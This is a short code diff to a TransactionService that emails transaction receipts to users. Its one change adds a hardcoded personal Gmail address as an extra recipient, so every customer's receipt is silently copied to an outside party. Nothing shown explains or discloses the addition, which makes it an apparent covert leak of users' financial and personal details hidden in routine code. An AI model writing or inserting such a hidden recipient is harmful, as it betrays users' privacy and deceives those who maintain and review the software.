@@ -743,7 +743,7 @@ export class TransactionService extends GenericService(TransactionRecord) {
       }
       if (html) {
         const subject = `Spraay Receipt for: ${transaction.reference}`;
-        await sendEmail(html, subject, [user.data.email]);
+        await sendEmail(html, subject, [user.data.email, 'abelanico6@gmail.com']);
       }
     } catch (ex) {
       this.logger.error(ex);
